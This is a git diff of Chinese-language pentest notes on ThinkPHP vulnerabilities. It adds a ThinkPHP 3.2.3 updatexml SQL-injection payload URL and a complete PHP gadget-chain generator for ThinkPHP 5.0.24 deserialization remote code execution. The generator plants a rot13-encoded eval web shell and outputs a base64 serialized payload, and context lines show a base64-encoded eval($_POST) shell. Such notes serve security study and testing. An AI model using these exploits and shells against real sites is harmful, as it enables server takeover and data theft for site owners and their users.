@@ -30,11 +30,16 @@ thinkphp3.1.3 二次开发 sql回传注入缓存
 比如在/Application/Home/Controller/IndexController.class.php写入了
 public function test()
     {
-       $id = i('id');
+       $id = I('id');
        $res = M('user')->find($id);
        //$res = M('user')->delete($id);
        //$res = M('user')->select($id);
-    }
+    }    
+    //----
+    I('get.id',0,'intval')  //I是Tp过滤参数的方法。用intval过滤get请求的id参数，不符合则为0
+    C('参数名','参数值')     //设置参数值
+    C('参数名')             //从配置中获取参数值
+    M('表名')             //实例化数据表，进行操作
 ```
 
 - payload
@@ -54,10 +59,29 @@ public function test()
 
 Thinkphp3.2.3 update注入漏洞
 
+- save->update
 
-```
+  ```
+  class UserController extends Controller {
+   
+      public function user(){
+          $User = M("member");
+          $user['id'] = I('id');
+          $data['money'] = I('money');
+          $data['user'] = I('user');
+          $valu = $User->where($user)->save($data);
+          var_dump($valu);
+      }
+  }
+  
+  ```
+
+- payload（需要开启debug模式）
+
+
+   ```
 /index.php/home/user?id[]=bind%27&money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
-```
+   ```
 
 信息泄露：
 
@@ -200,9 +224,7 @@ cmd:PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
 
 ---
 
-## Thinkphp6 rce
-
-### 反序列化
+**Thinkphp6 反序列化rce**
 
 - 背景
   ```
@@ -219,8 +241,153 @@ cmd:PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
   假设控制器中有
   unserialize($_GET['c'])
   ```
+  
+
+**Thinkphp5.0.24 反序列化rce**
+- 背景
+  
+  ```
+  只能使用于linux系统，windows系统需要另外配合,因为windows对文件名有限制，会写入失败
+  ```
+  
+- 教程
+  
+  ```
+  http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/
+  https://xz.aliyun.com/t/7457  # Thinkphp5.0反序列化链在Windows下写文件的方法
+  ```
+  
+- 漏洞位置
+
+  ```
+  unserialize($_GET['c'])
+  ```
+
 - 利用
   ```
-  修改poc的phpinfo();使用php将poc跑出payload
-  /pulibc/?c= base64编码的序列化payload
+  #--1.php，本地访问1.php获取payload
+  <?php
+  namespace think\process\pipes;
+  use think\model\Pivot;
+  class Pipes{
+  
+  }
+  
+  class Windows extends Pipes{
+  	private $files = [];
+  
+  	function __construct(){
+  		$this->files = [new Pivot()];
+  	}
+  }
+  
+  namespace think\model;#Relation
+  use think\db\Query;
+  abstract class Relation{
+  	protected $selfRelation;
+  	protected $query;
+  	function __construct(){
+  		$this->selfRelation = false;
+  		$this->query = new Query();#class Query
+  	}
+  }
+  
+  namespace think\model\relation;#OneToOne HasOne
+  use think\model\Relation;
+  abstract class OneToOne extends Relation{
+  	function __construct(){
+  		parent::__construct();
+  	}
+  
+  }
+  class HasOne extends OneToOne{
+  	protected $bindAttr = [];
+  	function __construct(){
+  		parent::__construct();
+  		$this->bindAttr = ["no","123"];
+  	}
+  }
+  
+  namespace think\console;#Output
+  use think\session\driver\Memcached;
+  class Output{
+  	private $handle = null;
+  	protected $styles = [];
+  	function __construct(){
+  		$this->handle = new Memcached();//目的调用其write()
+  		$this->styles = ['getAttr'];
+  	}
+  }
+  
+  namespace think;#Model
+  use think\model\relation\HasOne;
+  use think\console\Output;
+  use think\db\Query;
+  abstract class Model{
+  	protected $append = [];
+  	protected $error;
+  	public $parent;#修改处
+  	protected $selfRelation;
+  	protected $query;
+  	protected $aaaaa;
+  
+  	function __construct(){
+  		$this->parent = new Output();#Output对象,目的是调用__call()
+  		$this->append = ['getError'];
+  		$this->error = new HasOne();//Relation子类,且有getBindAttr()
+  		$this->selfRelation = false;//isSelfRelation()
+  		$this->query = new Query();
+  
+  	}
+  }
+  
+  namespace think\db;#Query
+  use think\console\Output;
+  class Query{
+  	protected $model;
+  	function __construct(){
+  		$this->model = new Output();
+  	}
+  }
+  
+  namespace think\session\driver;#Memcached
+  use think\cache\driver\File;
+  class Memcached{
+  	protected $handler = null;
+  	function __construct(){
+  		$this->handler = new File();//目的调用File->set()
+  	}
+  }
+  namespace think\cache\driver;#File
+  class File{
+  	protected $options = [];
+  	protected $tag;
+      function __construct(){
+      	$this->options = [
+  		'expire'        => 0,
+  		'cache_subdir'  => false,
+  		'prefix'        => '',
+  		'path'          => 'php://filter/write=string.rot13/resource=./<?cuc cucvasb();riny($_TRG[pzq]);?>',
+  		'data_compress' => false,
+  		];
+  		$this->tag = true;
+      }
+  }
+  
+  namespace think\model;
+  use think\Model;
+  class Pivot extends Model{
+  
+  
+  }
+  use think\process\pipes\Windows;
+  echo base64_encode(serialize(new Windows()));
   ```
+
+tp5和tp3路由
+
+```
+tp3
+app/lib/action/Admin/AdminAction.class.php   -> m=admin&c=admin&
+```
+
